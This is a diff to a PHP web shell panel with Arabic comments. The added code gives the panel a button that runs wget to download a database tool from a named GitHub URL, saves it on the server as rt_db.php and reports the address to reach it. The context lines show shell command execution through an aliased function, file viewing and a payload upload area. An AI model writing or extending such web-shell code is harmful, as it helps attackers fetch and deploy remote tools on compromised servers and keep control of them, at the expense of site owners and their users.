@@ -78,7 +78,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } else {
             $viewResult .= "\n[-] ERROR: Shell execution failed (check if wget is installed).";
         }
-    }    // عرض محتوى الملفات (نصوص)
+    }
+	// 3. معالجة زر جلب أداة Room Tech DB
+    if (isset($_POST['get_rt_db'])) {
+        // جلب السكربت من الرابط الخاص بك وحفظه باسم rt_db.php
+        $target_url = "https://raw.githubusercontent.com/mohamed99x/web/main/db_commander.php";
+        $cmd = "wget " . $target_url . " -O rt_db.php 2>&1";
+        $viewResult = $sx($cmd);
+        
+        if (file_exists('rt_db.php')) {
+            $viewResult .= "\n[+] SUCCESS: Room Tech DB deployed as rt_db.php";
+            $viewResult .= "\n[!] Access via: " . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/rt_db.php";
+        } else {
+            $viewResult .= "\n[-] ERROR: Failed to fetch the file. Check server connectivity or wget permissions.";
+        }
+    }
+	// عرض محتوى الملفات (نصوص)
     if (isset($_POST['view_f'])) {
         $f = $currentDirectory . '/' . $_POST['view_f'];
         if (file_exists($f)) $viewResult = $fg($f);
@@ -207,6 +222,9 @@ ob_clean();
     <button name="get_db_admin" value="1" class="btn-side" style="border-color: var(--gold); color: var(--gold);">
         <i class="fas fa-file-download"></i> جلب أداة DB Admin (wget)
     </button>
+				<button name="get_rt_db" value="1" class="btn-side" style="border-color: var(--main-red); color: var(--main-red); font-weight: bold;">
+        <i class="fas fa-database"></i> جلب Room Tech DB (wget)
+    </button>
             </form>
 
             <div class="side-tag">Payload Upload</div>
@@ -313,6 +331,7 @@ ob_clean();
 </div>
 </body>
 </html>
+
 
 
 
